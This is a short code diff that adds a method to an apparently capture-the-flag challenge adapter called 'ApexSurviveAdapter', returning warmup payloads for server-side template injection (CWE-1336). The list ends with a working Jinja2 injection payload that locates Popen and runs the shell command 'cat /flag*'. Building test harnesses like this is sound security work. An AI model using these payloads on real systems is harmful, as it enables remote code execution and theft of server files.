@@ -6,6 +6,16 @@ class ApexSurviveAdapter(ChallengeAdapter):
 
     challenge_name = "apexsurvive"
 
+    def get_warmup_payloads(self) -> dict[str, list[str]]:
+        return {
+            "CWE-1336": [
+                "{{7*7}}",
+                "{{config}}",
+                "{{''.__class__.__mro__[1].__subclasses__()}}",
+                "{% for x in (''.__class__.__mro__[1].__subclasses__()) %}{% if 'Popen' in x.__name__ %}{{x('cat /flag*',shell=True,stdout=-1).communicate()}}{% endif %}{% endfor %}",
+            ],
+        }
+
     def extra_rules(self) -> str:
         return """
 
